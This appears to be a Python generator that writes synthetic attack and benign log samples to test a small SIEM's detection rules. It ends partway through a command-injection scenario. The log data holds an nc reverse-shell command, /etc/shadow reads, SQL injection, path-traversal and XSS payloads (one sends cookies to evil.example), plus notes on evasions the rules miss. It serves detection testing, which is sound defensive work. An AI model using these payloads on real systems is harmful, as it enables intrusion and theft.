"""Generate the example log library in samples/examples/.

Each file is one self-contained scenario: benign baselines, single attack
techniques, a full intrusion chain, format edge cases, and evasions the current
rules deliberately do not catch. Every scenario is on its own date with its own
hosts, users, and IPs, so files can be loaded together without interfering.

samples/examples/manifest.json records each file's source type, ingest
options, and the exact alerts it should raise. backend/tests/test_examples.py
checks those expectations, and `python -m minisiem examples` loads them all.

    python scripts/generate_examples.py
"""

import json
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples" / "examples"
rng = random.Random(20261106)
UTC = timezone.utc


def day(month: int, d: int, h: int = 0, m: int = 0, s: int = 0) -> datetime:
    return datetime(2026, month, d, h, m, s, tzinfo=UTC)


def rand_public_ip() -> str:
    first = rng.choice([5, 31, 45, 61, 77, 91, 103, 109, 141, 159, 176, 185, 193, 212])
    return f"{first}.{rng.randint(1, 254)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"


def rand_key() -> str:
    return "".join(rng.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", k=43))


# ---------------------------------------------------------------------------
# Writers
# ---------------------------------------------------------------------------

class Log:
    def __init__(self):
        self.lines: list[tuple[datetime, int, str]] = []

    def add(self, when: datetime, line: str):
        self.lines.append((when, len(self.lines), line))

    def text(self) -> str:
        return "\n".join(line for _, _, line in sorted(self.lines)) + "\n"


class AuthLog(Log):
    """Linux auth.log / secure. fmt='iso' (RFC 3339) or 'bsd' (classic syslog)."""

    def __init__(self, host: str, fmt: str = "iso", tz: timezone = UTC):
        super().__init__()
        self.host, self.fmt, self.tz = host, fmt, tz

    def _stamp(self, when: datetime) -> str:
        local = when.astimezone(self.tz)
        if self.fmt == "bsd":
            return local.strftime("%b ") + f"{local.day:>2}" + local.strftime(" %H:%M:%S")
        return local.replace(microsecond=rng.randint(0, 999999)).isoformat(timespec="microseconds")

    def line(self, when, prog, msg, pid=None):
        self.add(when, f"{self._stamp(when)} {self.host} {prog}[{pid or rng.randint(900, 65000)}]: {msg}")

    def ssh_fail(self, when, user, ip, invalid=False):
        pid, port = rng.randint(900, 65000), rng.randint(30000, 65000)
        if invalid:
            self.line(when, "sshd", f"Invalid user {user} from {ip} port {port}", pid)
        prefix = "invalid user " if invalid else ""
        self.line(when + timedelta(seconds=1), "sshd",
                  f"Failed password for {prefix}{user} from {ip} port {port} ssh2", pid)

    def ssh_ok(self, when, user, ip, method="publickey", minutes=20, uid=1000):
        pid, port = rng.randint(900, 65000), rng.randint(30000, 65000)
        key = f": ED25519 SHA256:{rand_key()}" if method == "publickey" else ""
        self.line(when, "sshd", f"Accepted {method} for {user} from {ip} port {port} ssh2{key}", pid)
        self.line(when, "sshd", f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)", pid)
        if minutes:
            self.line(when + timedelta(minutes=minutes), "sshd",
                      f"pam_unix(sshd:session): session closed for user {user}", pid)

    def sudo(self, when, user, cmd, tty="pts/0", cwd=None, error=None):
        err = f"{error} ; " if error else ""
        self.line(when, "sudo",
                  f"{user} : {err}TTY={tty} ; PWD={cwd or '/home/' + user} ; USER=root ; COMMAND={cmd}")
        if not error:
            self.line(when, "sudo", f"pam_unix(sudo:session): session opened for user root(uid=0) by {user}(uid=1000)")

    def useradd(self, when, user, uid):
        pid = rng.randint(900, 65000)
        self.line(when, "useradd", f"new group: name={user}, GID={uid}", pid)
        self.line(when, "useradd",
                  f"new user: name={user}, UID={uid}, GID={uid}, home=/home/{user}, shell=/bin/bash, from=/dev/pts/0", pid)

    def usermod_group(self, when, user, group):
        pid = rng.randint(900, 65000)
        self.line(when, "usermod", f"add '{user}' to group '{group}'", pid)
        self.line(when, "usermod", f"add '{user}' to shadow group '{group}'", pid)

    def gpasswd(self, when, user, group, by="root"):
        self.line(when, "gpasswd", f"user {user} added by {by} to group {group}")

    def cron(self, when):
        pid = rng.randint(900, 65000)
        self.line(when, "CRON", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)", pid)
        self.line(when + timedelta(seconds=1), "CRON", "pam_unix(cron:session): session closed for user root", pid)

    def pam_fail(self, when, user, ip):
        self.line(when, "sshd", "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 "
                                f"tty=ssh ruser= rhost={ip}  user={user}")


UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Mobile Safari/537.36",
]
BOT_UAS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]


class AccessLog(Log):
    """Apache/Nginx access log. combined=False writes Common Log Format."""

    def __init__(self, combined: bool = True, tz: timezone = UTC):
        super().__init__()
        self.combined, self.tz = combined, tz

    def req(self, when, ip, method, path, status, ua=None, size=None, ref="-", user="-"):
        stamp = when.astimezone(self.tz).strftime("%d/%b/%Y:%H:%M:%S %z")
        if size is None:
            size = rng.randint(900, 52000) if status == 200 else rng.randint(0 if status == 304 else 140, 620)
        line = f'{ip} - {user} [{stamp}] "{method} {path} HTTP/1.1" {status} {size}'
        if self.combined:
            line += f' "{ref}" "{ua or rng.choice(UAS)}"'
        self.add(when, line)


# ---------------------------------------------------------------------------
# Reusable background activity
# ---------------------------------------------------------------------------

def auth_background(log: AuthLog, date: datetime, admins: dict[str, str], ci: tuple[str, str] | None = None,
                    noise_ips: int = 6):
    """A normal day: hourly cron, admins logging in from their usual IPs with routine sudo,
    an optional CI account deploying every two hours, and low-volume internet SSH noise."""
    for h in range(24):
        log.cron(date + timedelta(hours=h, minutes=17))
    if ci:
        user, ip = ci
        for h in range(0, 24, 2):
            t = date + timedelta(hours=h, minutes=4, seconds=rng.randint(0, 50))
            log.ssh_ok(t, user, ip, minutes=2, uid=1001)
            log.sudo(t + timedelta(seconds=15), user, "/usr/bin/systemctl restart app.service", cwd="/srv/app")
    routine = ["/usr/bin/apt update", "/usr/bin/systemctl status nginx", "/usr/bin/journalctl -u app -n 200",
               "/usr/bin/tail -n 100 /var/log/syslog", "/usr/bin/systemctl reload nginx", "/usr/bin/df -h",
               "/usr/bin/docker ps", "/usr/bin/apt list --upgradable"]
    for user, ip in admins.items():
        for h in rng.sample([8, 9, 10, 11, 13, 14, 15, 16, 17], 3):
            t = date + timedelta(hours=h, minutes=rng.randint(0, 55), seconds=rng.randint(0, 59))
            log.ssh_ok(t, user, ip, minutes=rng.randint(5, 40))
            log.sudo(t + timedelta(minutes=2), user, rng.choice(routine))
    for _ in range(noise_ips):
        ip = rand_public_ip()
        t = date + timedelta(minutes=rng.randint(0, 24 * 60 - 20))
        for i in range(rng.randint(1, 3)):
            user = rng.choice(["root", "admin", "ubuntu", "test", "user", "oracle"])
            log.ssh_fail(t + timedelta(minutes=4 * i), user, ip, invalid=user not in ("root", "ubuntu"))


def web_background(log: AccessLog, date: datetime, visits: int, clients: int = 40, site="shop.example.com"):
    """Shoppers browsing during the day, with assets, the odd 404, and search-engine bots."""
    ips = [rand_public_ip() for _ in range(clients)]
    pages = ["/", "/products", "/about", "/contact", "/cart", "/checkout", "/search?q=boots",
             "/search?q=rain+jacket"] + [f"/products/{i}" for i in range(1, 60)]
    for _ in range(visits):
        hour = min(23, max(0, int(rng.gauss(14, 4.5))))
        t = date + timedelta(hours=hour, minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
        ip, ua, page = rng.choice(ips), rng.choice(UAS), rng.choice(pages)
        log.req(t, ip, "GET", page, 200, ua, ref=f"https://{site}/")
        log.req(t, ip, "GET", "/static/css/main.css", rng.choice([200, 304]), ua, ref=f"https://{site}{page}")
        log.req(t + timedelta(seconds=1), ip, "GET", "/static/js/app.js", rng.choice([200, 304]), ua)
        if rng.random() < 0.12:
            log.req(t + timedelta(seconds=2), ip, "GET", "/favicon.ico", 404, ua)
        if rng.random() < 0.08:
            log.req(t + timedelta(seconds=40), ip, "POST", "/api/cart", 201, ua)
    for _ in range(visits // 20):
        t = date + timedelta(minutes=rng.randint(0, 24 * 60 - 1))
        log.req(t, rng.choice(["66.249.66.1", "66.249.66.20", "157.55.39.10"]), "GET",
                rng.choice(pages), 200, rng.choice(BOT_UAS))
    log.req(date + timedelta(hours=3, minutes=1), ips[0], "GET", "/robots.txt", 200, rng.choice(BOT_UAS))


SCAN_WORDS = [
    ".env", ".git/config", ".git/HEAD", ".htaccess", ".htpasswd", ".DS_Store", ".svn/entries", "admin",
    "admin.php", "administrator", "admin/login", "backup", "backup.zip", "backup.tar.gz", "backup.sql", "bak",
    "cgi-bin/", "cgi-bin/test.cgi", "config", "config.php", "config.json", "config.yml", "console", "dashboard",
    "db", "db.sql", "database.sql", "debug", "dev", "dump.sql", "files", "include", "install", "install.php",
    "login", "login.php", "logs", "manager/html", "old", "panel", "phpinfo.php", "phpmyadmin", "pma", "private",
    "server-status", "server-info", "setup", "shell.php", "sql", "staging", "temp", "test", "test.php", "tmp",
    "upload", "uploads", "user", "users", "v1", "v2", "vendor", "web.config", "webadmin", "wp-admin",
    "wp-config.php", "wp-config.php.bak", "wp-content", "wp-includes", "wp-login.php", "xmlrpc.php",
    "api/v1/users", "api/swagger.json", "swagger-ui.html", "actuator", "actuator/health", "actuator/env",
    "jenkins", "solr", "graphql", "graphiql", ".aws/credentials", "id_rsa", "id_rsa.pub", "secrets", "storage",
    "telescope", "elmah.axd", "trace.axd", "crossdomain.xml", "sitemap.xml", "README.md", "CHANGELOG.md",
    "composer.json", "package.json", "Dockerfile", "docker-compose.yml", ".dockerenv", "info.php", "status",
    "metrics", "prometheus", "kibana", "grafana", "adminer.php", "phpMyAdmin/index.php", "mysql", "owa",
    "remote", "portal", "sso", "auth", "oauth", "keys", "certs", "export", "import", "reports", "invoice",
]
FOUND = {"admin": 301, "login": 200, "api/v1/users": 401, ".git/HEAD": 403, "uploads": 403,
         "sitemap.xml": 200, "status": 200, "auth": 302}


def web_scan(log: AccessLog, start: datetime, ip: str, ua: str, words: list[str], spacing_ms: int):
    for i, w in enumerate(words):
        log.req(start + timedelta(milliseconds=spacing_ms * i), ip, "GET", f"/{w}",
                FOUND.get(w, 404), ua, size=rng.randint(140, 420))


def web_payloads(log: AccessLog, start: datetime, ip: str, ua: str, payloads: list[tuple[str, str, int]],
                 spacing_s: int = 7):
    for i, (method, path, status) in enumerate(payloads):
        log.req(start + timedelta(seconds=spacing_s * i), ip, method, path, status, ua)


# ---------------------------------------------------------------------------
# Scenarios
# ---------------------------------------------------------------------------

@dataclass
class Example:
    file: str
    source_type: str
    title: str
    description: str
    build: callable
    expected_alerts: dict = field(default_factory=dict)
    expected_unparsed: int = 0
    host: str | None = None
    year: int | None = None
    category: str = "attack"
    gap: str | None = None  # what the current rules intentionally miss


EXAMPLES: list[Example] = []


def example(**kw):
    def wrap(fn):
        EXAMPLES.append(Example(build=fn, **kw))
        return fn
    return wrap


# -- auth: baselines ----------------------------------------------------------------

@example(file="auth-benign-workday.log", source_type="auth", category="benign",
         title="Normal workday on a bastion host",
         description="Admins log in from their usual IPs, run routine sudo, cron runs hourly, CI deploys "
                     "every two hours, and a handful of internet IPs try one to three passwords each.")
def _():
    log = AuthLog("bastion-a")
    auth_background(log, day(10, 1), {"mchen": "10.1.0.21", "priya": "10.1.0.34", "okafor": "10.1.0.40"},
                    ci=("ci-deploy", "10.1.0.5"), noise_ips=10)
    return log


@example(file="auth-benign-weekend-quiet.log", source_type="auth", category="benign",
         title="Quiet weekend: cron and a single on-call login",
         description="Almost nothing happens: cron, one on-call engineer checking disk space, and a few "
                     "background SSH probes.")
def _():
    log = AuthLog("bastion-b")
    d = day(10, 4)
    for h in range(24):
        log.cron(d + timedelta(hours=h, minutes=17))
    log.ssh_ok(d + timedelta(hours=11, minutes=2), "oncall-jr", "10.2.0.15", minutes=6)
    log.sudo(d + timedelta(hours=11, minutes=3), "oncall-jr", "/usr/bin/df -h")
    for _ in range(4):
        log.ssh_fail(d + timedelta(minutes=rng.randint(0, 1400)), "root", rand_public_ip())
    return log


@example(file="auth-new-ip-travel.log", source_type="auth", category="benign",
         expected_alerts={"MSIEM-006": 3},
         title="Staff logging in from new locations (benign)",
         description="Three staff members log in from their office IP in the morning, then from a hotel, a "
                     "home connection and the new VPN range in the evening. A fourth user's first-ever "
                     "login has no baseline, so it does not alert.")
def _():
    log = AuthLog("bastion-c")
    d = day(10, 6)
    moves = {"lnguyen": ("10.3.0.11", "82.132.45.9"), "tsato": ("10.3.0.12", "73.92.10.44"),
             "rfarah": ("10.3.0.13", "10.8.4.20")}
    for user, (office, away) in moves.items():
        log.ssh_ok(d + timedelta(hours=9, minutes=rng.randint(0, 50)), user, office)
        log.ssh_ok(d + timedelta(hours=19, minutes=rng.randint(0, 50)), user, away)
    log.ssh_ok(d + timedelta(hours=10), "newhire01", "10.3.0.77")  # first login ever: baseline only
    return log


# -- auth: attacks --------------------------------------------------------------------

@example(file="auth-ssh-bruteforce.log", source_type="auth", expected_alerts={"MSIEM-001": 1},
         title="SSH brute force that fails",
         description="One IP tries 40 passwords against root and common service accounts over three "
                     "minutes and never gets in.")
def _():
    log = AuthLog("bastion-d")
    d = day(10, 8)
    auth_background(log, d, {"aruiz": "10.4.0.21"})
    t = d + timedelta(hours=2, minutes=14)
    for i in range(40):
        user = rng.choice(["root", "root", "admin", "test", "postgres", "ubuntu", "git", "pi", "oracle"])
        log.ssh_fail(t + timedelta(seconds=4 * i + rng.randint(0, 2)), user, "203.0.113.45",
                     invalid=user not in ("root", "ubuntu"))
    return log


@example(file="auth-password-spray.log", source_type="auth", expected_alerts={"MSIEM-001": 1},
         title="Password spray across many accounts",
         description="One IP tries a single password against 30 different usernames. Each account sees "
                     "only one failure, but the source IP crosses the brute-force threshold.")
def _():
    log = AuthLog("bastion-e")
    d = day(10, 9)
    auth_background(log, d, {"bkim": "10.5.0.21"})
    users = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy", "mallory",
             "niaj", "olivia", "peggy", "rupert", "sybil", "trent", "victor", "walter", "admin", "backup",
             "jenkins", "deploy", "support", "sales", "hr", "finance", "it", "helpdesk", "guest"]
    t = d + timedelta(hours=4, minutes=40)
    for i, user in enumerate(users):
        log.ssh_fail(t + timedelta(seconds=7 * i), user, "198.51.100.77", invalid=True)
    return log


@example(file="auth-compromise-chain.log", source_type="auth",
         expected_alerts={"MSIEM-001": 1, "MSIEM-002": 1, "MSIEM-003": 2, "MSIEM-004": 1,
                          "MSIEM-005": 1, "MSIEM-006": 1},
         title="Full intrusion: brute force to backdoor account",
         description="The attacker guesses the CI account's password after 9 tries, reads /etc/shadow, "
                     "opens a root shell, creates 'svc-sync' and adds it to sudo. This raises six "
                     "different alerts.")
def _():
    log = AuthLog("bastion-f")
    d = day(10, 11)
    auth_background(log, d, {"dlopez": "10.6.0.21"}, ci=("ci-runner", "10.6.0.5"))
    ip = "192.0.2.150"
    t = d + timedelta(hours=1, minutes=33)
    for i in range(9):
        log.ssh_fail(t + timedelta(seconds=5 * i), "ci-runner", ip)
    t_in = t + timedelta(seconds=55)
    log.ssh_ok(t_in, "ci-runner", ip, method="password", minutes=9, uid=1001)
    t = t_in + timedelta(minutes=1)
    log.sudo(t, "ci-runner", "/usr/bin/cat /etc/shadow", tty="pts/3", cwd="/srv/app")
    log.sudo(t + timedelta(seconds=30), "ci-runner", "/bin/bash", tty="pts/3", cwd="/srv/app")
    log.sudo(t + timedelta(minutes=2), "ci-runner", "/usr/sbin/useradd -m -s /bin/bash svc-sync", tty="pts/3", cwd="/root")
    log.useradd(t + timedelta(minutes=2), "svc-sync", 1007)
    log.sudo(t + timedelta(minutes=3), "ci-runner", "/usr/sbin/usermod -aG sudo svc-sync", tty="pts/3", cwd="/root")
    log.usermod_group(t + timedelta(minutes=3), "svc-sync", "sudo")
    return log


@example(file="auth-insider-privesc.log", source_type="auth", expected_alerts={"MSIEM-003": 6},
         title="Insider abusing sudo",
         description="A legitimate user, logging in from their normal IP, uses sudo to read credential "
                     "files, plant a setuid binary, start a reverse shell, decode a payload and edit "
                     "sudoers, mixed in with routine commands. One sudo attempt fails, and the rule still "
                     "flags it because the command (su) is suspicious.")
def _():
    log = AuthLog("app-db-01")
    d = day(10, 13)
    auth_background(log, d, {"kwalsh": "10.7.0.44", "jmorris": "10.7.0.45"})
    t = d + timedelta(hours=18, minutes=12)
    log.ssh_ok(t, "kwalsh", "10.7.0.44", minutes=40)
    cmds = [
        ("/usr/bin/systemctl status postgresql", None),
        ("/usr/bin/cat /etc/shadow", None),
        ("/usr/bin/cp /usr/bin/find /tmp/.f", None),
        ("/usr/bin/chmod u+s /tmp/.f", None),
        ("/usr/bin/nc -e /bin/sh 203.0.113.99 4444", None),
        ("/usr/bin/base64 -d /tmp/.p", None),
        ("/usr/bin/journalctl -u postgresql -n 50", None),
        ("/usr/bin/vim /etc/sudoers", None),
        ("/bin/su", "3 incorrect password attempts"),
    ]
    for i, (cmd, err) in enumerate(cmds):
        log.sudo(t + timedelta(minutes=2 + i * 3), "kwalsh", cmd, tty="pts/1", error=err)
    return log


@example(file="auth-persistence-accounts.log", source_type="auth",
         expected_alerts={"MSIEM-004": 3, "MSIEM-005": 2},
         title="New accounts and privileged group changes",
         description="An admin onboards an intern (new user plus the unprivileged 'developers' group). "
                     "Later 'svc-monitor' is created and added to wheel via gpasswd, and 'backup' is added "
                     "to sudo via usermod.")
def _():
    log = AuthLog("build-01")
    d = day(10, 15)
    auth_background(log, d, {"hwong": "10.9.0.21"})
    log.useradd(d + timedelta(hours=10, minutes=5), "intern01", 1010)
    log.usermod_group(d + timedelta(hours=10, minutes=6), "intern01", "developers")
    log.useradd(d + timedelta(hours=23, minutes=41), "svc-monitor", 1011)
    log.gpasswd(d + timedelta(hours=23, minutes=42), "svc-monitor", "wheel")
    log.useradd(d + timedelta(hours=23, minutes=44), "backup", 1012)
    log.usermod_group(d + timedelta(hours=23, minutes=45), "backup", "sudo")
    return log


# -- auth: format and edge cases -----------------------------------------------------

@example(file="secure-rhel-classic-syslog.log", source_type="auth", year=2026,
         expected_alerts={"MSIEM-001": 1},
         title="RHEL /var/log/secure with classic syslog timestamps",
         description="Old-style 'Oct 17 03:12:09' headers with no year (ingest with --year 2026), "
                     "single-digit days padded with a space, and PAM authentication-failure lines next to "
                     "sshd's own. Contains one brute force.", category="format")
def _():
    log = AuthLog("rhel-web-02", fmt="bsd")
    d = day(10, 17)
    auth_background(log, d, {"sgupta": "10.10.0.21"})
    t = d + timedelta(hours=3, minutes=12)
    for i in range(8):
        log.pam_fail(t + timedelta(seconds=6 * i), "root", "203.0.113.200")
        log.ssh_fail(t + timedelta(seconds=6 * i + 1), "root", "203.0.113.200")
    return log


@example(file="auth-early-month-bsd.log", source_type="auth", year=2026,
         title="Classic syslog on single-digit days",
         description="Classic headers on the 2nd of the month ('Nov  2 ...'), to exercise the "
                     "double-space day padding. Benign only.", category="format")
def _():
    log = AuthLog("legacy-01", fmt="bsd")
    auth_background(log, day(11, 2), {"pmarsh": "10.11.0.21"}, noise_ips=3)
    return log


@example(file="auth-timezone-ist.log", source_type="auth", expected_alerts={"MSIEM-001": 1},
         title="Timestamps with a +05:30 offset",
         description="An RFC 3339 log written in India Standard Time. A brute force at 05:28 local "
                     "time is 23:58 UTC the previous day, so it should appear on the 19th in the "
                     "dashboard.", category="format")
def _():
    log = AuthLog("bastion-in", tz=timezone(timedelta(hours=5, minutes=30)))
    d = day(10, 19)
    auth_background(log, d, {"anair": "10.12.0.21"}, noise_ips=2)
    t = d + timedelta(hours=23, minutes=58)
    for i in range(7):
        log.ssh_fail(t + timedelta(seconds=9 * i), "admin", "45.155.205.233", invalid=True)
    return log


@example(file="auth-malformed-lines.log", source_type="auth", expected_alerts={"MSIEM-001": 1},
         expected_unparsed=12,
         title="Corrupted and malformed lines",
         description="Valid events interleaved with 12 lines that cannot be parsed: truncated "
                     "headers, an impossible date, JSON and binary junk, a bare message and a stack "
                     "trace. The parser should count and skip them, and still detect the brute force "
                     "around them.", category="format")
def _():
    log = AuthLog("flaky-01")
    d = day(10, 21)
    auth_background(log, d, {"ewhite": "10.13.0.21"}, noise_ips=2)
    t = d + timedelta(hours=6)
    for i in range(6):
        log.ssh_fail(t + timedelta(seconds=10 * i), "root", "91.240.118.172")
    junk = [
        "2026-10-21T06:00:",
        "Oct 21 06:00:0",
        "Feb 30 06:00:00 flaky-01 sshd[1]: impossible date",
        '{"ts":"2026-10-21T06:00:00Z","msg":"structured log in the wrong file"}',
        "���\u0001\u0002 binary junk",
        "Failed password for root from 1.2.3.4 port 22 ssh2",
        "Traceback (most recent call last):",
        '  File "/usr/lib/python3/dist-packages/x.py", line 1, in <module>',
        "-- MARK --",
        "2026-13-45T99:99:99+00:00 flaky-01 sshd[1]: bad iso date",
        "flaky-01 sshd[1]: header without a timestamp",
        "2026-10-21T06:01:00+00:00 flaky-01-message-without-program",
    ]
    for i, line in enumerate(junk):
        log.add(t + timedelta(seconds=5 + 10 * i), line)
    return log


@example(file="auth.log.1", source_type="auth", expected_alerts={"MSIEM-004": 1},
         title="Rotated log file (auth.log.1)",
         description="A logrotate-style file name. The dashboard upload accepts rotated names such as "
                     ".log.1. Contains one new account.", category="format")
def _():
    log = AuthLog("bastion-g")
    d = day(10, 23)
    auth_background(log, d, {"cbrown": "10.14.0.21"}, noise_ips=3)
    log.useradd(d + timedelta(hours=14, minutes=30), "contractor7", 1020)
    return log


# -- auth: known gaps -------------------------------------------------------------------

@example(file="auth-distributed-bruteforce.log", source_type="auth", category="gap",
         title="Distributed brute force (low and slow)",
         description="80 different IPs each try root twice over 40 minutes. That is 160 failures, but "
                     "no single IP reaches the threshold.",
         gap="Per-IP thresholds miss botnet-style attacks. A per-target-user threshold or a global "
             "failure-rate rule would catch this.")
def _():
    log = AuthLog("bastion-h")
    d = day(10, 25)
    auth_background(log, d, {"mgarcia": "10.15.0.21"}, noise_ips=0)
    t = d + timedelta(hours=1)
    for i in range(80):
        ip = f"185.{rng.randint(1, 254)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"
        start = t + timedelta(seconds=30 * i)
        log.ssh_fail(start, "root", ip)
        log.ssh_fail(start + timedelta(minutes=7), "root", ip)
    return log


@example(file="auth-sudo-denied.log", source_type="auth", category="gap",
         title="Repeated sudo denials",
         description="A user who is not in sudoers keeps trying, and another fails their password three "
                     "times. The commands themselves are routine.",
         gap="No rule watches sudo failures. Repeated 'NOT in sudoers' events are a useful "
             "privilege-escalation signal.")
def _():
    log = AuthLog("app-02")
    d = day(10, 27)
    auth_background(log, d, {"tlee": "10.16.0.21"}, noise_ips=2)
    t = d + timedelta(hours=15)
    log.ssh_ok(t, "summer-intern", "10.16.0.88", minutes=30)
    for i in range(6):
        log.sudo(t + timedelta(minutes=1 + i), "summer-intern", rng.choice(
            ["/usr/bin/apt install nmap", "/usr/bin/systemctl stop auditd", "/usr/bin/cat /var/log/auth.log"]),
            error="user NOT in sudoers")
    log.sudo(t + timedelta(minutes=12), "tlee", "/usr/bin/systemctl restart nginx", error="3 incorrect password attempts")
    return log


# -- web: baselines ---------------------------------------------------------------------

@example(file="access-benign-ecommerce.log", source_type="web", host="shop-web-01", category="benign",
         title="Normal e-commerce traffic",
         description="A day of shoppers, static assets, cart posts, search-engine crawlers and the "
                     "occasional favicon 404.")
def _():
    log = AccessLog()
    web_background(log, day(10, 2), visits=700)
    return log


@example(file="access-false-positive-urls.log", source_type="web", host="blog-web-01", category="benign",
         title="Legitimate URLs that look suspicious",
         description="Real-world URLs containing words like 'union', 'select', 'script' and 'passwd', "
                     "a 'javascript' tutorial, and maths in a query string. None of them should alert.")
def _():
    log = AccessLog()
    d = day(10, 3)
    web_background(log, d, visits=150, site="blog.example.com")
    urls = [
        "/search?q=union+station+parking", "/search?q=credit+union+near+me",
        "/blog/how-to-select-a-script-font", "/blog/selecting-the-right-union-for-your-trade",
        "/docs/javascript-tutorial", "/docs/javascript/arrays", "/api/v1/users?select=name,email",
        "/search?q=1+%2B+1+%3D+2", "/help/reset-passwd", "/blog/etc-and-other-abbreviations",
        "/search?q=O%27Reilly+books", "/search?q=rock+%26+roll", "/products?sort=price&order=desc",
        "/blog/2026/10/cat-pictures", "/search?q=whoami+podcast",
    ]
    for i, u in enumerate(urls):
        log.req(d + timedelta(hours=12, minutes=i * 3), rand_public_ip(), "GET", u, 200)
    return log


# -- web: attacks ---------------------------------------------------------------------------

@example(file="access-gobuster-scan.log", source_type="web", host="shop-web-02", expected_alerts={"MSIEM-007": 1},
         title="Directory brute force with gobuster",
         description="One IP requests about 130 wordlist paths in roughly a minute. Most return 404; "
                     "a few hit real paths (301, 403, 401).")
def _():
    log = AccessLog()
    d = day(10, 5)
    web_background(log, d, visits=250)
    web_scan(log, d + timedelta(hours=2, minutes=40), "192.0.2.77", "gobuster/3.6", SCAN_WORDS, 480)
    return log


@example(file="access-two-scanners.log", source_type="web", host="api-web-01", expected_alerts={"MSIEM-007": 2},
         title="Two separate scanners",
         description="ffuf from one IP in the morning, and dirb from another in the evening. They are "
                     "separate bursts, so they raise two alerts.")
def _():
    log = AccessLog()
    d = day(10, 7)
    web_background(log, d, visits=200)
    web_scan(log, d + timedelta(hours=6), "203.0.113.10", "Fuzz Faster U Fool v2.1.0", SCAN_WORDS[:60], 300)
    web_scan(log, d + timedelta(hours=20), "198.51.100.200", "Mozilla/4.0 (compatible; dirb)", SCAN_WORDS[40:100], 700)
    return log


@example(file="access-sqli-sqlmap.log", source_type="web", host="shop-web-03", expected_alerts={"MSIEM-008": 8},
         title="SQL injection attempts (sqlmap-style)",
         description="Union-based and boolean-based SQL injection payloads, URL-encoded and plain. Two "
                     "time-based blind payloads are included that the rule does not match.",
         gap="Time-based blind SQLi (SLEEP, WAITFOR DELAY, pg_sleep) is not in the pattern list.")
def _():
    log = AccessLog()
    d = day(10, 10)
    web_background(log, d, visits=200)
    payloads = [
        ("GET", "/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-", 500),
        ("GET", "/products?id=1+UNION+ALL+SELECT+NULL,NULL,NULL--", 500),
        ("GET", "/products?id=-1%20union/**/select%201,2,version()", 500),
        ("GET", "/products?id=1%27%20UnIoN%20sElEcT%20table_name%20FROM%20information_schema.tables--", 500),
        ("GET", "/products?id=1%27%20OR%20%271%27%3D%271", 200),
        ("GET", "/login?user=admin%27%20or%201%3D1--&pass=x", 302),
        ("GET", "/products?id=1%27%20AND%201%3D2--", 200),
        ("GET", "/search?q=x%27%20and%20%270%27%3D%270", 200),
        ("GET", "/products?id=1%27%20AND%20SLEEP(5)--", 200),
        ("GET", "/products?id=1;WAITFOR%20DELAY%20%270:0:5%27--", 200),
    ]
    web_payloads(log, d + timedelta(hours=3, minutes=15), "192.0.2.88", "sqlmap/1.9#stable", payloads)
    return log


@example(file="access-path-traversal.log", source_type="web", host="files-web-01", expected_alerts={"MSIEM-008": 6},
         title="Path traversal and local file inclusion",
         description="../ sequences in many encodings, plus direct /etc/passwd reads. One double-encoded "
                     "payload is decoded only once by the parser and slips through.",
         gap="Double URL-encoding (%252e%252e%252f) is decoded only once, so it evades the traversal pattern.")
def _():
    log = AccessLog()
    d = day(10, 12)
    web_background(log, d, visits=150)
    payloads = [
        ("GET", "/download?file=../../../../etc/passwd", 400),
        ("GET", "/download?file=..%2F..%2F..%2Fetc%2Fshadow", 400),
        ("GET", "/static/..%2f..%2f..%2fapp%2fconfig.py", 404),
        ("GET", "/view?page=....//....//etc/passwd", 400),
        ("GET", "/include.php?file=/etc/passwd", 200),
        ("GET", "/download?file=..\\..\\windows\\win.ini/../", 400),
        ("GET", "/download?file=%252e%252e%252f%252e%252e%252fetc%252fhosts", 400),
    ]
    web_payloads(log, d + timedelta(hours=9), "203.0.113.66", "curl/8.10.1", payloads)
    return log


@example(file="access-xss-probes.log", source_type="web", host="forum-web-01", expected_alerts={"MSIEM-008": 4},
         title="Cross-site scripting probes",
         description="Reflected XSS attempts with <script> tags in mixed case, encoded, and javascript: "
                     "URLs. Two event-handler payloads have no <script> and are not matched.",
         gap="Event-handler XSS (<img onerror=...>, <svg onload=...>) is not in the pattern list.")
def _():
    log = AccessLog()
    d = day(10, 14)
    web_background(log, d, visits=150, site="forum.example.com")
    payloads = [
        ("GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", 200),
        ("GET", "/search?q=%3CScRiPt%20src%3D//evil.example/x.js%3E%3C/sCrIpT%3E", 200),
        ("GET", "/profile?next=javascript:alert(1)", 302),
        ("GET", "/comment?body=%3C%20script%3Efetch(%27//evil.example/%27%2Bdocument.cookie)%3C/script%3E", 200),
        ("GET", "/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", 200),
        ("GET", "/search?q=%3Csvg%20onload%3Dalert(1)%3E", 200),
    ]
    web_payloads(log, d + timedelta(hours=16), "198.51.100.140", rng.choice(UAS), payloads, spacing_s=25)
    return log


@example(file="access-command-injection.log", source_type="web", host="iot-web-01", expected_alerts={"MSIEM-008": 4},
         title="OS command injection",
